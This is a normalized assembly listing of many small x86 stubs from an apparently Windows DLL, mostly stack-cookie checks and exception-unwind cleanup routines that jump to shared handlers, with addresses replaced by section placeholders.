mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f8d8
push [ ebp - 0x14 ]
call sub_100272e8
pop ecx
retn
sub_1004f8e2
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004f8fb
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
jmp sub_1000794c
sub_1004f917
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f935
push [ ebp - 0x10 ]
call sub_100272e8
pop ecx
retn
sub_1004f93f
push [ ebp - 0x10 ]
call sub_100272e8
pop ecx
retn
sub_1004f949
push [ ebp + 0xc ]
call sub_100272e8
pop ecx
retn
sub_1004f953
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f96e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f989
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f9a4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f9bf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f9da
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f9f5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fa10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fa2b
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10021d53
sub_1004fa36
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fa51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fa6c
lea eax [ ebp + 0x18 ]
jmp sub_10017910
sub_1004fa74
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fa8f
lea esi [ ebp + 0xc ]
jmp j_sub_10017cc8
sub_1004fa97
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov esi [ ebp + 0x8 ]
jmp j_sub_10017cc8
sub_1004fab0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004facb
lea eax [ ebp + 0x8 ]
jmp sub_10017910
sub_1004fad3
lea eax [ ebp - 0x44 ]
jmp sub_10017910
sub_1004fadb
lea eax [ ebp - 0x28 ]
jmp j_sub_10017910
sub_1004fae3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fafe
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_1000ba54
sub_1004fb09
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fb24
lea esi [ ebp - 0x10 ]
jmp sub_1000ae13
sub_1004fb2c
lea esi [ ebp - 0x14 ]
jmp sub_1000ae13
sub_1004fb34
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fb4f
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_1000327f
sub_1004fb5a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fb75
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fb90
lea eax [ ebp + 0x8 ]
jmp j_sub_10017910
sub_1004fb98
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_1000d3de
pop ecx
pop ecx
retn
sub_1004fba6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fbc1
lea eax [ ebp + 0x8 ]
jmp j_sub_10017910
sub_1004fbc9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fbe4
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
call sub_1000d3de
pop ecx
pop ecx
retn
sub_1004fbf2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fc0d
lea eax [ ebp + 0xc ]
jmp j_sub_10017910
sub_1004fc15
lea eax [ ebp - 0x2c ]
jmp j_sub_10017910
sub_1004fc1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fc38
lea eax [ ebp + 0x8 ]
jmp j_sub_10017910
sub_1004fc40
lea eax [ ebp - 0x24 ]
jmp j_sub_10017910
sub_1004fc48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fc63
mov ecx [ ebp - 0x10 ]
jmp sub_10021eac
sub_1004fc6b
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001f21
sub_1004fc76
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_10001f21
sub_1004fc81
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_10001f21
sub_1004fc8c
mov ecx [ ebp - 0x10 ]
add ecx 0x58
jmp sub_10001f21
sub_1004fc97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fcb2
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004fcba
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fcdf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fcfa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fd15
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fd30
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004fd38
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fd60
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004fd68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fd8d
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004fd95
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10027150
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fdbd
mov ecx [ ebp - 0x10 ]
jmp sub_1000d27a
sub_1004fdc5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fde0
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_1000d31e
sub_1004fdeb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fe06
mov ecx [ ebp - 0x10 ]
jmp sub_100274ce
sub_1004fe0e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fe29
mov ecx [ ebp - 0x10 ]
jmp j_sub_10001d9b
sub_1004fe31
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fe4c
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004fe54
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004fe5c
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004fe64
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fe89
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_1000d2d9
sub_1004fe94
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004feaf
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10002699
sub_1004feba
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fed5
mov ecx [ ebp + 0x8 ]
jmp sub_10002699
sub_1004fedd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004fef8
mov ecx [ ebp - 0x10 ]
jmp sub_10001d9b
sub_1004ff00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ff1b
mov ecx [ ebp - 0x10 ]
jmp sub_1000a3fa
sub_1004ff23
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ff3e
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ff46
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004ff4e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ff73
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004ff7b
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ff83
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ffa8
lea ecx [ ebp - 0x34 ]
jmp sub_10007dbd
sub_1004ffb0
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004ffb8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10027150
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ffe0
lea ecx [ ebp - 0x50 ]
jmp sub_10007dbd
sub_1004ffe8
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1004fff0
lea ecx [ ebp - 0x4c ]
jmp sub_10001f21
sub_1004fff8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7c ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10027150
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050020
lea ecx [ ebp - 0x54 ]
jmp sub_10007dbd
sub_10050028
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005004d
lea ecx [ ebp - 0x54 ]
jmp sub_10007dbd
sub_10050055
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_1005005d
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10050065
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1005006d
lea ecx [ ebp - 0x60 ]
jmp sub_10007dbd
sub_10050075
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005009a
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10015974
sub_100500a5
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_10015974
sub_100500b0
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_100500b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100500d3
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_100500db
lea ecx [ ebp - 0x54 ]
jmp sub_10001f21
sub_100500e3
lea ecx [ ebp - 0x54 ]
jmp sub_10001f21
sub_100500eb
lea ecx [ ebp - 0x54 ]
jmp sub_10001f21
sub_100500f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050118
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050133
mov esi [ ebp + 0x8 ]
jmp sub_10018678
sub_1005013b
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000acc7
sub_10050146
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050161
lea esi [ ebp - 0x4c ]
jmp sub_10018678
sub_10050169
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050187
lea ecx [ ebp - 0x3c ]
jmp sub_10001f21
sub_1005018f
lea ecx [ ebp - 0x64 ]
jmp j_sub_10001d9b
sub_10050197
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100501b2
lea eax [ ebp + 0x18 ]
jmp j_sub_10017910
sub_100501ba
mov esi [ ebp - 0x10 ]
jmp j_sub_10017cc8
sub_100501c2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100501dd
lea ecx [ ebp - 0x238 ]
jmp sub_10001f21
sub_100501e8
lea ecx [ ebp - 0x238 ]
jmp sub_10001f21
sub_100501f3
lea ecx [ ebp - 0x238 ]
jmp sub_10001f21
sub_100501fe
lea ecx [ ebp - 0x27c ]
jmp sub_10001f21
sub_10050209
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2a8 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050231
push [ ebp - 0x14 ]
call sub_100272e8
pop ecx
retn
sub_1005023b
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_10050254
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
jmp sub_1000794c
sub_10050270
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005028e
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001f21
sub_100502a7
lea ecx [ ebp - 0x34 ]
jmp sub_10001f21
sub_100502af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100502ca
lea ecx [ ebp - 0x28 ]
jmp sub_10001f21
sub_100502d2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100502ed
mov ecx [ ebp + 0x8 ]
jmp sub_10015974
sub_100502f5
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_100502fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050318
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_10050320
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_10050328
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_10050330
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_10050338
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050353
mov ecx [ ebp + 0x8 ]
jmp sub_10002699
sub_1005035b
lea ecx [ ebp - 0x38 ]
jmp sub_10001f21
sub_10050363
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005037e
lea ecx [ ebp - 0x3c ]
jmp sub_10001f21
sub_10050386
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100503a1
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_100503a9
lea ecx [ ebp - 0x54 ]
jmp sub_10001f21
sub_100503b1
lea ecx [ ebp - 0x54 ]
jmp sub_10001f21
sub_100503b9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100503de
lea ecx [ ebp + 0xc ]
jmp sub_10007dbd
sub_100503e6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050401
mov ecx [ ebp - 0x10 ]
jmp sub_10002699
sub_10050409
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050424
lea eax [ ebp - 0x24 ]
jmp sub_10008dca
sub_1005042c
lea eax [ ebp - 0x24 ]
jmp sub_10008dca
sub_10050434
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005044f
mov esi [ ebp + 0x8 ]
jmp sub_1000acac
sub_10050457
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000acc7
sub_10050462
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005047d
mov esi [ ebp + 0x8 ]
jmp sub_1000a578
sub_10050485
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000acc7
sub_10050490
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100504ab
mov esi [ ebp + 0x8 ]
jmp sub_1000a29b
sub_100504b3
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000acc7
sub_100504be
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100504d9
mov esi [ ebp + 0x8 ]
jmp sub_1000a013
sub_100504e1
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000acc7
sub_100504ec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050507
lea ecx [ ebp - 0x70 ]
jmp sub_10001f21
sub_1005050f
lea ecx [ ebp - 0x70 ]
jmp sub_10001f21
sub_10050517
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1005051f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050540
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005055b
lea ecx [ ebp - 0x3c ]
jmp sub_10007dbd
sub_10050563
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1005056b
lea ecx [ ebp - 0x5c ]
jmp sub_10002699
sub_10050573
lea ecx [ ebp - 0x5c ]
jmp sub_10002699
sub_1005057b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100505a0
mov eax [ ebp + 0x8 ]
jmp sub_10013909
sub_100505a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100505c3
mov eax [ ebp + 0x8 ]
jmp sub_10001431
sub_100505cb
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10002699
sub_100505d6
mov ecx [ ebp + 0x8 ]
add ecx 0x38
jmp sub_10001f21
sub_100505e1
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10001f21
sub_100505ec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050607
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_1000d3de
pop ecx
pop ecx
retn
sub_10050615
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050630
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005064b
lea ecx [ ebp - 0x34 ]
jmp sub_10007dbd
sub_10050653
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1005065b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050680
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001f21
sub_10050699
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100506b4
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_100506bc
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_100506c4
lea ecx [ ebp - 0xdc ]
jmp sub_10001f21
sub_100506cf
lea ecx [ ebp - 0xa4 ]
jmp sub_10001f21
sub_100506da
lea ecx [ ebp - 0x88 ]
jmp sub_10001f21
sub_100506e5
lea ecx [ ebp - 0xc0 ]
jmp sub_10001f21
sub_100506f0
lea ecx [ ebp - 0x6c ]
jmp sub_10001f21
sub_100506f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050720
lea eax [ ebp - 0x20 ]
jmp sub_10008dca
sub_10050728
lea eax [ ebp - 0x18 ]
jmp sub_10008dca
sub_10050730
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0xc ]
jmp sub_10002699
sub_10050749
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050764
lea eax [ ebp + 0x10 ]
jmp sub_10008dca
sub_1005076c
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_10008dca
sub_10050777
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050792
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1005079a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100507b5
lea eax [ ebp + 0x10 ]
jmp sub_10008dca
sub_100507bd
lea ecx [ ebp - 0x28 ]
jmp sub_10001f21
sub_100507c5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100507e0
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_10008dca
sub_100507eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10050806
lea ecx [ ebp - 0x40 ]
jmp sub_10001f21
sub_1005080e
